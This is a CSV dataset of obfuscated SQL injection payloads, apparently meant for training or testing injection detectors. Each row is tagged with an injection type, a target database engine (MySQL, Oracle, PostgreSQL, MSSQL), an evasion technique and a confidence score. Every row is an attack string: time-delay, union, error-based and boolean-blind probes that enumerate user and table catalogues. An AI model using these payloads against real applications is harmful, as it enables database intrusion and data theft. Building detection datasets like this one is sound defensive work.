payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"0B1' ) +{As dvoY wHeRe 0B0X8EE2 -likE| 0O0O0O0b0b0b111000110101100101010011011101110100011110010000101000000110101100110111111100110100111010010010111011110111100100010100111011010110101011111001101111110 ANd CHAr (^,0x6D ) OR`ChAr,:( 0x2F )< OR CHAr! (( 0x46 ) /*emJ*/Or cHar}^( 0X0O11x0b101A ) .LIKe ;reGEXP_SUBstrinG,|( REpeAT ( -RighT) ( char/* usd}4UO fIw*/ (& 0x13b2{`) ,(SeleCT_4) ) ,(sELECt 0b100101050880907107000161001080000) ) ,Null )% OR FAlSe$aNd 0X5 OR/*w.kEA*/0O12340! NoT[ LIKE (sElecT (SeLecT (SELEcT (sELeCt 0x14E0))))>and&(seLEcT (SELEcT (SelECT 0x1))) or ""ORKU2"" nOT_LIke ""orkU2"" or<fAlSE,OR>FaLSe Or (SeLECt (seLECT (SeLecT 0X0))) Or faLSe or FAlsE Or 0 --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"7'+ ( SElect KqAc WhERE*(selECT 0o10411) lIKE (SElect (seleCT 4360)) and:6x2078 ^= Dbms_PIPe.reCEiVe_mESsAGE= ( cHr"" ( 0B100O0o305 ) <@|| CHR `(; (sELeCt 0X4F) -)_ Or CHr? (* (sELEcT (SELeCt/**/0x1))! ) ||cHr ( 0B0B0O0o902 ) ,0X5 )< oR""FALSe OR 0O0xC24 LiKe} (SELeCt 0xE2D)).aND 0X640 LikE (SeLEcT 0O0O0Xc1C) aND '0'<NoT LIke '0E' AnD (selecT (SELeCt;(seleCT 1))) oR (SelEcT 0x615)}Not IN ((sEleCT 0X614),(SELeCT 0X615),(SELECt (selEcT 1758))) ANd True aNd (SelEcT 0O1) ANd;true or FaLse aND TrUE or fAlsE oR FALse --",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,in_clause
"3""\ )`` ); And 1x6x0o0b5b0x0B612D5X0x6D! like (sELEcT-0O4b1011x5O5x0X0b1D3B110d)>? AnD &\ ?(& /*`.@WGzsZhba^`V[9cr*/ ( ""RNni""{lIke^""RnNI",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"( SElect ( cASE When ( ?0X224D .LikE (sELeCt (sElecT 0o14401)) ) then 0X1 ELsE/**/cAST ( 0x0x1 AS inT ) / ( SElEct (SEleCT (SEleCt (SELECT 0))) FroM DuAl, ) End ) frOm DUAL )",error_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
1/*q|8yO1PA*/ ) _as cwSI WhERE 0X1CC5 /*(SELECT (SELECT 6))#/0X0x9*s!t*/ like~ ]0x0x3CC0 or{ sLEEP ( '(sELecT-(SEleCt (SELeCt (SeleCT (SELect 5)))))+>) !#AcL H&DV,unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.05,rule,sqliv5_json,unknown
"0O5"". )/*|*/) whERe(0x0b0b10101011111000E7 &=}/9177",unknown,unknown,comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0b1' ) ) ) and (SELECT (SELECT 0x954)) = benchmark ( 0b0b10000111101011001010001000111111100111111111010010001010001111100101000000,md3 ( 0o0x6d457156 ) ) OR/**/1520=1501#!SJS",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0O10"" WHerE:0o7632 lIke ]0o0O0B0x49DA8F5Da6 and (SELECt (SeLeCT (seleCt (SeLECt (sElEct (SELECT (SeLECT (seLeCt 0X1984)))))))) liKE| dbMS_piPe.recEIVE_MEsSAgE/*(fJvj2:*/ ( Chr (~ (seLect (seLEcT 0X4C)) ) $ or cHr /*Jv)pPRnmN`RA/CI*/( 4x74 ) oR CHr/**/ (` 0o121\ ) , oR ChR ( 0b8X11 ) ,0b0x3x5 /*w)e*/) Or falSE)Or (seleCT (selEct (SeLect (SeLECT (sElECT (selECT (sElEct (SELECT 0)))))))) or fAlsE and ""L"" lIkE ""L""[And ""_"",nOt LIkE ""_W"" oR ""oD0"" Not lIKe ""OD9"" ANd 'd('='D('&&TRue AnD "" "" LIke "" "" ANd ""u!'""=""u!'"" OR False --",boolean_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,string_double_quote
1' ) : AS XiQw whEre-(SELeCT (seLecT (selECT (SELect 0x223B)))) = /**/0x7o325B rLIkE SLeEP ( (SElEct 0O2) ) oR (SelECT (sEleCt (SELECT 2158))) Not liKe 2878_--,unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.05,rule,sqliv5_json,unknown
"9'[@)/**/:$ |/ && ;;:5X522e^ lIKe; ~[/( ;seLECT^coUnT[?() *^<) !^FROm""sysusErS^aS;syS9o0X1,sysuserS As\sYS0b0x0xA,SYsUSERS(As/*)IUgII*/SyS0b101,sysUsErS/_R7Cd*/&)\rwt}as 110h!*/as^sys8B505,SysusERs|aS SYs0x0B0B1110101x0B101o0O22O0o0o5,SYSuSerS$aS@sYs0x2B0x0B0b0b1000010001110100000111001001001,sysusERS*As/*|?Hn,*/syS0X0o0O0x0/*R|UelA0X6 (SeLecT 0X5)*/ ) /**/;AND ((~\'ZPZf'<=?'Zpzf",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"8' Or ( SELEcT<'qsGI'-wheRE 0X6aB LIKe! 7X7b1O3o3a0o0X8 or (SelECt 0O0X0b211001001d) LIKE=/*iFC}/{R*p(M~aTEDh~*/ ( ;select|CoUNT^ (` * ){ ~FroM DomAiN.DOMaInS`AS t0X1,DOmain.COLumns as T2,DOMAin.tAblES as T6o0o6 AnD*truE:AND 'Rw_x' LiKe 'RW_X' oR ;""R4"" noT LIKe ""R8"" Or;faLSe anD ' w 2' Not lIKe ' W 0o0B14F' or. 0b110b0x4&&TRUe Or 0X5dA=(SelECt (sElEcT 0b0o3733)) OR 'h' NOT LIkE 'H' oR (SelEct (sELECt^0X0)) aNd TRuE && TrUe OR ';' lIke ';u' AND True AND TRuE anD trUE oR FAlSE aND tRUE Or fAlsE OR FALse oR]FAlsE Or FaLSe AND True OR False#+ ) _) +* OR}'kY Qo\=.zqUWo?%aVL/9sD",boolean_blind,unknown,case_variation|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"3'+ ""( ;SeLEcT 'arZm' whErE/(seLEcT 0x3340) '=:;2x1640(oR](sELEct 0X8112) /**/= BeNChMarK ( OR 0x0o0O0 OR (sELECT 0X0) AND ""uART""<>""UArTe"" anD 0x1 anD trUE# 0X0o0b100111110101100110110011180,mD0O8 (@ 0x0O0x634A0o4b0b11010001101110010010111010100000011101100 %). +); ; )/* (SeLEct (sELECt 0O3))HH?v*/ +'&N8C/hx`^p-=j",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0O0X1' ) &&ExTraCtvaLUE ( (SelEct (Select (SElECt (SeLecT 3x1F2e)))),CONcAT _(,/0O0x5c,0b0B101x0B0b11011010910111901111010A71, ( SEleCT ; ( ELT ( 2X1F2E LikE{/**/0x0O0X1f2e,0X5X0o1 ) ) `) ,0x617a0B1011111111a91 ) ; ) ANd ( 'pmzP'='PMzp",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0B0x7%'~ANd.0O3X146E ]like,/>&(%""seLECT'COUnt;~(: *\ )+~~FROm SySuseRS{aS/*+S0B0b0b1000010001110100000111001001001j0o0o0o0 8IzJ]_4J-iEE Ka91M*/SYS0O4,sYsuseRs,AS/*]Ur>lf*8a-y/g{:7m&{;L1kV*/Sys0B0B1100100O0b3B0B0B10000151000o0O3,sYsuserS`As/**/SyS0O3,sysUseRs/*(selECT-(SELECt]8o7X9))~\Mc]CmBa\L*/e-bza-f RfJ]*/AS+SYs8B0X0o5b0o0x6x5,SysUSERs""as!syS4,SysuSErS~as>sys6,sysuseRS\AS\syS0O0o0B100!?)|`{and '%'='",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"7' )/*)(SelECt (SElECT](selEct (SeLEct (selecT (SelecT 89))))))!E;*/ +and\make_SeT (/*FtD]t*/ 1X0b0O24D0 -= ?3B0X20D3,0x0X22C0O1+ )(= && ]_{* (-+'ojAG' liKe, 'ojag",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"selecT+beNChMArk ([ 5x4C4b0B0X0O34,MD5(;( ^7x0x2B6X2e9c0B100D0o13774/**/ _){[ )&?",time_blind,mysql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.45,rule,sqliv5_json,unknown
"If *(&/*n,+/!N]jU he)*/0x0o0X2159=0o0b11110011010111_;)$/**/$sElEcT 0O0B0O0xc51f*ELSE droP~fUncTIon=VQMP--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1 :)$ As EsTm WhErE 0o6x32C9O11/**BR`<R<D9(*/ like (sEleCt (selECT[(SELEcT (SeLECt (SELECT 4801))))) UnioN All seLeCt nULL,nUlL,null--",union_based,unknown,case_variation|inline_comment,0.8,rule,sqliv5_json,unknown
"0o0B0O1"" ]) AS+zhLF WhERE/*(sELEct (sEleCT (seLECT (SELEct (SelECT (SELECT 2))))))&GQavt Or ""a"" lIke ""aJ"" ANd< 2533<>0b100111100110 or falSE && 'd'!='dp' oR 0 or FAlSE OR False#L<'Q$M</?5IH7r'R*/0o0b0b1090949110121 likE (SElECT 0x0o31430)| OR (SELecT (SelEcT (SELeCT (sELecT?(SELeCT (seLeCt 5286)))))) likE ' /**/(@ selEct cOunT '( { or (seLect/**/(sELEcT (selECt (sElEcT 1707)))) NOt Like 8707 ANd (SELEct 0O1)#8U* )]}`fRom alL_UsErS$t3,aLl_Users&T9,all_USeRS*T3,aLL_uSeRS T4,alL_uSers t0o7 ) --a]2._2",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"8'[; ) ) LiKe :) + ] AND ` 0o0O8x1O0o11b6x0B1d5a ,= :(/* ]QV)}K\sOUe;:(SelECT 8)yiN*/(sELeCt coUnt ""( * ) FrOM domain.dOMAiNs as T0o6x3,DOMAIN.CoLumnS]as!T0B0B1111101011b0b2104101,doMaiN.tableS<aS t0b101x6o0o2: ) &and (""=( ((.'oFkO' {LIKe /*V*(sElECT (SeLeCT (SElEcT (SElECT 0O0))))*/ 'ofKO",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1 )% and cHAR ~( ;(select (seLeCT (SELECT 0x7))) ) "" oR cHar (/ (seLeCt/*z0 y2*/122) ) ! || chAR }( $(SeLect 0X61) ), ) Or CHaR ( (SeLECT (SelEcT (selEct 0x0))) ) ~= ReGeXp_substrinG ( RepeaT @( &lEFT ( CRYPT_KeY ( chAR ( 0B110B5b110110151011101002001 ) || CHar ( 0o0x3D ) OR chAR ( (SeLEcT (sELECt 0X53)) ) ?,nUlL ) ,0o0x0 ) ,2O0O3563262800 ) ,nULl ) ""oR FaLSe AND ""0""=""0o0X0o0""@or (sElEcT (SELeCT (SeLect (seLeCt (sELeCt (selEcT (sELEcT (SELect (SELECT 0))))))))) Or FAlSe|--",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0O3b6X8' ), ;\AND ?8B8B9310O8x6773= (, selECt COuNt (.\*>/*[O.T36ZJ)`L ]r3^e4+:*/)/*|/V ZF4*/-[FROm>DomaIN.doMaINS<aS/**/T0b0,doMaIn.cOLumnS[As't0b7,DOmain.tables Or (SELECT 0)""or!faLsE or falsE#aS[T0o0b6O0O0o3o1o2@ )><]aND: &(>:'vGKt'_]Like~ 'VgKt|e0b11",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"SelECt benchMaRk .( (SELecT (sElEcT (SElEct (SeLeCt 0x5B8D80)))),md6 ( 1x4c6D0b1011111111110 )) )/**/ && (, ( ""%"" liKE -""",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1+where 0b1100001001101/**/ LIKE 0b1100001001111`rlike sleep ( 5 ;) OR ""K""!=""K""#!:y*",unknown,mysql,comment_whitespace|inline_comment,0.05,rule,sqliv5_json,string_double_quote
"1 )& )< && uPDATEXML ( 0o0O14545,COncaT ( :2x2e,0X0X0x0b110cD0x106A71, <( SElect ( ?ELT !( 0Xd48 liKe 0X0xd41,0x5B1/*iT2LO,qp'dA0o10 U;hh:P]*/ [) ), ;( )^/*}Ea*/,0B2x817A0o613a0b1001111 )"" ,(SElECT 0X0B0B111101090) ) ANd]+ .-( ; +( {(SeLECT<(SELeCt 0X1x0O4b1010111011010)) = 5624",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0o84B0O7o4B0%"" _ ) ) ^ && 0b0b2O0o0x1b9Af0b10101111""=""DBms_pIpe.rEcEiVe_MESsAge% ( *chr[>( 4x0o70; ) OR Chr ^( 8X0O5x8X0A ){ oR chR ((@(SELEcT!(seLECt.(seleCT (seLeCT 0b131X6b)))) )*: oR(cHR ( 0B0x69;[); ,0B8B0x6B0x0b9X52: ) ANd ; ( ( `/* A|^ ,R-`i')+e5 sEfJ{ >IB (sElecT (select!0X5))/ZPn?N ;>h!y8SppGd{2*/""%"" ]= """,unknown,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,unknown
"1%"" or rOW ( 0X415,0X1d8A ) > ( sELeCT cOUnt ( * )` ,CoNCaT -( 0X7171706A71, (/**/ seLECt+ ( eLT ( (sElEcT (SELECt (SELECT (SELECT 1015))))/**/ LiKE (seLeCT (SeLECt (SeLecT (SELECT 1645)))),0x0b0o1 ) ) ) ,0x0x2cDA6O1377a74,FLooR ( raNd ( 0b0 ). *(selEct/*D#u>4""*/(SeLecT 2))] ) , ) X FrOM ( seLect (SeleCT (SElECT 0X2128)) union|seLECT 0x15D0 union seLEct 0xbEB uNIoN`sELEcT 0X4ba ) ;A gRoUp BY x ) anD ""%""=""",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0X1""{ && rOw (! 0b0x0O0O0b1101010101D,0o0b1110100101101 ])% > ( ""SELEcT`COuNT+ ( * ) ,cOnCaT ( 0x2371708a0O0O0O194, ( seLEcT ~(, Elt (/mPOl:3T5OqqMh1z*/C>gp+*/ 0X085D Like 8x185D,0X1!/**/ )~ ^() ): ,0b5O0X0b1011001101a0O1127A0b0X47,flO Or! * :(( RaNd ( $0X0 ) *(sELECT 0X0X2) ) ^ ) X`froM $ ( SElECt (SELEcT (sELECT (SElect (seLect (SELECt (sElECt (selecT (SELEct 5222)))))))) uNion|selecT 3b111011001001 UNiOn]seLeCT""5xf0b101b Union SeLeCT (SElEcT (SeLEct (SELecT (sELect 0O0x1BEC)))) ) ;a Group by X ) anD ""NzGN"" ?liKe ""Nzgn",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"5%"") ) AND 0x1 OR (SELECT 0x16da) NOT LIKE (SELECT 0x16da)#) / ) . Or^(sEleCt 2x5933) LIKe_? ( sElECT.COunt ( j*/**/ ) frOm DomaIN.DoMaiNs_as T5,dOMaiN.columNs AS[T2B0B1010,DOMaIN.tABLES as<T3 $) OR <faLsE anD-TRue or FalsE oR faLSE and TruE Or falSe OR FaLSE#oR 0X4O1D0XA NoT LiKe 0X0X1D9b1010'oR False --+;(seLeCt (sELECT (SELECT 0x7)))~Idg~4",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"sElEcT\CounT~\( '*> )/*Da1YN?GcxsKTZf*/ FROm_all_UseRs~T9o0b101,alL_useRs T7B5b0b10010001100010010000000001001101010110001000,all_UsErS+t0b71,ALl_USeRS T7,all_userS@t7 anD ;(! '%' lIke++'",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"3b2x6O0o0o0B9570x8b0O0b0x5B7B0x8o5x0x0O0O0x5B2x5B4o0X0B6O0B0o10X0x0o8o55""{_^)-`(^)\(}{UNion;alL/*Z;y(<G7o0X5]:""EL\?^=IWKqK)MmyGhM9]`L)@/bzCbY)`aRb<H](zU aQ^ w| ;p*/sELEcT]NuLl,null,null,nUlL,NuLl,nUll,nUlL,nULL,nuLL--",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"1""/*n|to{*/:) WHERE 0o8751 LiKe 0b1111101031 pROceduRE[AnAlyse '( ExTrACTvAlue ( 1o0O54151,concAt )( ""0x0b111C, ( bEncHMArk ( 0x4d5cB2,md0 ( 2O3x5b774c75 ) < ) / ) } ) *) ,(sElecT 0x1)} ) And (SeLecT_(sElect,(SELEcT (SELECT (SELECT (SELECT (SELECT (SELECT 9179)))))))) LiKe 0B110X1537 OR FalSE AnD TRuE?&& ""fE""<>""FeU"" && ""H""<>""HG"" && tRUE OR (SELECT (SELECT 0x63a))=(SELECT 0x63b)#(I]wU;f1=Hokf{D:P",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.44,rule,sqliv5_json,unknown
"7' ) ) < /**/ )/*i/*/ oR 9XA49=dbms_piPE.REceIVe_MessAGe ( chR ( &4B2b0X51 ) or cHr ( (sElEcT 0x61) ) or!chr ( 0o0O0O0x0X23/**Wn3bIL?k*/ ) Or-ChR ]( 0o0x67 ) ,0B9x0b102 ]) AnD ( > (/*i""RB*/ ( Or falSe Or (seLECt 0XfaA)=(SElECT 0x0b101001051001)| or false OR FALSe Or FALSe Or false%OR FalSE or FALSE Or (SelECT (SeLecT (Select (SeLEct (seLecT (SELECT 0)))))) ANd (sELEcT (SeLECT 0x1)) Or faLSe or False OR FaLSE anD (SeLeCt 1) Or 0x5De=(sEleCT 1503) Or FALSe#'XwHi' {= 'XwhI%s:q7STSN?uSkWO",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"7' ) ) + && (SeLect_0O1O0b0XF51) liKE ("" SElEcT (SElecT+0xcA) FROM\pG_sLEEP >( 0X5B103 ) ; ) /*(SElect (sElEcT (sELECt (SELeCT (SELECT 6)))))*/ AnD %(; ( ]?'pRJF' = 'PrJF",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0B0x1' )& as JdMh whERE 0b0X481F lIKe ((SELECT 0X08C3)>RLIKe sLeEP (|""(sELEct (SELEct (sELECt 5))) *)@/*A9\(GpKa0Ub Uva{\k8 */ && tRue aNd TRUe aND TRuE Or &(SELECT 0) OR{FalSe anD (SELect 1) oR FALSE#cjYl",unknown,mysql,case_variation|comment_whitespace|inline_comment,0.05,rule,sqliv5_json,unknown
"0b0o0B0b9%"" ) ] ) %) ` OR (seLect 0O2312) LIKe ( seleCt count ( * `) ! FrOM AlL_UseRS)t0,ALl_usERs/**/T2,aLl_uSers T0O0B26,All_USErS}T4,ALl_USErS~T5/*|Y?s5;~rJ+\:`Iwh(p{w (SeLEcT (SELECT 4))4J]4K*/ ) OR (selecT 0x0) ~ && (SElEcT 0o7) AND tRUe AND (sELeCt (SELECT (SELECT 2))) Or (SELECT (seLecT (SELECT 0x0))) And ';'=';' --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_single_quote
0B104'?iN*BoOLEAn Mode; ) / uNioN AlL/*(selecT.0X1o44)]SAGl*/SELECt NULL--,union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"1"" ) , ) /**/As TGWP wHEre (sELeCt 0b0b0b11100101110100011010110011010000010101100010100111100010111101001110110010111151001000101100010000100011100011001001001110011001000000000111101) lIke 9405",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1 where 0X5X75B9, LIKe (SeleCt (SElECt 0X14E7)) AND 0b0B0Xeaa, LIKE ) ( sELEcT uPpeR ( xmlTYPE _( {CHR ( 0o0X5c ) ||CHR ( 0x0x3a ) ~ Or chr ( 3x0O145* ) oR ChR ( (SEleCT 0X8f) \)_ OR Chr ( (SelECt 0b0x70) )? +Or chR ( 0x0x9A ) Or CHr_ ( 0X71 ) Or|( sElECt /*)$(SELecT (sELeCT (select (seleCt 4))))?~vv`(SeLeCT (SelECT 0X0b100)) m f2R>YX@Acd>3*/( cASe whEn (_ 3xEaA=(sELEct 0b111010621010) ) theN?(SelECT (SElECT (sELEcT (selECT (seLeCt (SELecT 1)))))) ELSe 0b0O0 end ) froM DUal ) :||CHR (< 0b1170001 ) * OR cHR ( 0B0B1111310 ) . oR~ CHR ( ]0b0o7271576| ) or@cHr ( 0O0X9a ) +/oR)CHr ( (SEleCT[(seLect 0x266)) ) ||Chr ( (seleCT (SeLecT 0b101010)) )? ) )) FROm DUal`^) oR faLSe aNd trUE and?(SElECT (select (SeleCt 0B0x0O4064)))!=(sElecT 0x1fd0) oR FaLse OR falsE ANd TRuE OR (SelECT~0x0x2570) Like (seLECt 0X253F) Or fALsE And tRUE OR faLSe AND trUe:oR`FAlSE aNd (seLect (selEct (SElecT (selECt (sELEct (SELEcT (SelEcT (sElect (SeLEcT 0x1)))))))))=or (SelECt 0X0) ANd ""i^Jr"" != ""I^jr("" OR false AND tRUe or FALsE OR FAlse oR ""d"" NoT likE ""D"" and 1 aND 1 aND tRuE && 9941 nOt LiKE (SElECT 0X26d6) && TruE OR 0 OR False --",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.06,rule,sqliv5_json,string_double_quote
"1/*`0x8)KaO7o*/ ) ) + { ) rLike (/**/(selEct ( case wHen }:( 0XfE4 LikE 0o4O0B119B1050101110101101 ~) THeN\0B0O0x0b11@eLSE 1X38,eNd ) ;* ) *, !\AND ; ({ ($/*:&/V*^!I:;?SPaR K*/ ( 0X0b0o1891Ee=0O0b0x0b107110601010",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1"","")/*jz*/ AS ROvD;WHeRe 0b311910110185: LIKe 0xe78 and elt ( (selecT (SELECT (SELECT 4249))) LIKE]0o0X0093,(seleCT (SELECT (SELECT (SELECT 7219)))) ) [or ""~]lp"" noT LiKe AND True#""~]lp"" OR False --",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_double_quote
0o1/**/ ) +AS msAT wheRE\0X7af=1967,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1 anD 0x0b10051108010=UTL_InAdDR.GET_hOST_addrEss ( CHr! ( 0x0X71 ) or cHr ( (SElECT 0x71) ); or Chr ( 0B0O6413667?[) Or cHr! ( ?8B0Xb0! ) OR CHr] ( (seLECT (seLeCT (SElEct (SelEcT 0X71)))) )=Or; (^ sElEct } ( cASe wheN (:~0x52B=0x178D /) Then|(SELect (sELeCt (sEleCt 2x1))) ELsE 0o0O5B9B0`end ) ] fROM&DuaL; )` or CHr (| (SelEct (seLEcT 0X0X46)) )} OR cHr; (: 0B1111010 ) OR CHR (~ (sELECt 2XD0o2) ), || CHR ( (SElEcT (sELEct (sEleCt/**/(sElEcT (Select (sEleCT (SElECT 0X7A)))))))} ) oR&chR (/ (SeLECT 0x71) )~ )",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"1%"" `) AnD CHaR (> 0X38d ) ||chaR/*wE\>x*/ ( 0x4F^ ), Or cHAR ( &(select 0B0Xf42aE) )) ||CHar ( (SEleCT (sEleCT 0b1011110))` ) like REgExP_suBSTRiNg ( ,rEPEAt ( &RIGHt ( ;chaR ( 0o0b1001110013100 ) ,(SELECT 0o0X0o0)/ ) ;,0b13700010190111600] )` ,nuLL )^ oR-(SelECt 0O0b0X2) oR (SeLEct (SELEcT (SelECt 0x118F))) liKE (sElECt (sEleCt 0X1193))||""RP"" nOt()lIke ""rp"" Or ""c9UT""=""c0x0X0O0X9ut~""&&true^aNd 'B)' not LiKe/'B)+' or "" F"" Not liKE "" F"" AnD TrUe OR fALSE && tRUE AnD TRUE ANd trUE)And (SEleCt (seLECT (SelECT{(sEleCT (SeLECt (sELeCT (SEleCt (SeLEcT (sElEct (SELeCT (sELeCT 1))))))))))) aND ""+""=""+"" Or fAlSe or 'Mf' liKe 'MF8' OR FaLSE,aND (sELecT (SELECT 9017)) Not LIke 0x233A aND (SELECT (SELECT 1)) ANd 'ADoBo'='ADoBO' OR (seleCT 0) OR faLsE AND "" ""<>"" _"" AND True --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"3O1 wHEre (SelECt""8506) /**/= && True#?0b10000100111010dj",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
3') )+ As QcsE|wHeRE?(SElECT (SELect 0X23a7))_ lIkE./**/ (seLECT (seLECT 0b10X1015)) wAiTF oR DelAy '0o0B7b0B0:(seLEcT)(SELECT 0)):0o0o0'--,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_single_quote
"9' ) ) as?iniD wherE (sELeCT 0x1E84)=(sELecT 0b0b0B1211016000191) oR}(SELect (SElEcT (selECT (selECT 0x1a89))))=& ( seleCt/*[?qr1gu) AJ`*/6799 fROm Pg_sLEEP~ ( 0b0b1100101; ) ) AnD 5138 In OR False OR False OR "";""="";L""#(0x0x0O214B,(SELect 5438),0X0b10111010101)<Or+""u"" NOt lIke~""u"" or FALsE --F`mFu9`",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"1%'/*?-*/ )( ) ] ` ) ?<AnD (sEleCT (seleCT:0b0B0B0b1110101100011101100001111010000111010111000011001000110000101011110000100100010000101111000101111100011001001100010111011010110111011))= ( /**/SeLECt Count (/ Or FalSE#* ) fRoM GENeRATe_SERieS ( 0X3B0B1100101o0B5x0o9o1,0o11045379 ) / ) . anD ; ( ( & ( '%' liKe '",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"0O1'& )-\ whERe (SeLeCT\(sElECT&(SELECT 0577))) !LIke 0b0b10000001001110111101101100111111001111000_UNION}aLL sELECT/*X0Ajqs*/nuLl,nULl,nuLL,nULL,NuLL,NUlL OR (SELect (SELECT (SELECT 0))) OR False#",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"wAitfor delAy '2:(selECT (seLECt>(sELecT (SELECT 0)))):6B0b0b0b0O222',aNd ,/( ?< (?+ 'NvqF'~ liKe^/**aG*/'NVQf",time_blind,mssql,case_variation|inline_comment,0.46,rule,sqliv5_json,unknown
